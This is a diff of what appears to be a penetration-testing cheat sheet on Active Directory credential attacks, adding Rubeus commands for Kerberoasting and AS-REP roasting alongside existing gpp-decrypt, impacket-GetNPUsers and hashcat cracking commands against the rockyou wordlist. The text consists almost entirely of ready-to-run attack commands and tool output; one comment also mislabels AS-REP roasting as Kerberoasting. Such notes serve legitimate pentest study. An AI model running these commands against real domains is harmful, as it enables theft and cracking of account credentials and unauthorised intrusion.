@@ -52,8 +52,10 @@ Group Policy XML files
 Crack XML cpassword string
 gpp-decrypt {HASH}
 
+
 Kerberoast Rubeus Crack:
 TGS-REP Hash
+PS C:\> .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 kali@kali:~$ hashcat --help | grep -i "Kerberos"         
   19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
   19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
@@ -67,10 +69,10 @@ kali@kali:~$ hashcat --help | grep -i "Kerberos"
 sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 AS-REP-Roast Crack:
+PS C:\> .\Rubeus.exe asreproast /nowrap  <-- Using Rubeus to kerberoast locally.
 impacket-GetNPUsers -dc-ip 192.168.x.x  -request -outputfile hashes.asreproast corp.com/mute <-- Using GetNPUsers to perform AS-REP roasting remotely.
 
-Check correct mode for an AS-REP hash by grepping for "Kerberos" in hashcat help.
-
+Check correct mode for an AS-REP hash by grepping for "Kerberos" in hashcat help:
 kali@kali:~$ hashcat --help | grep -i "Kerberos"
   19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
   19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
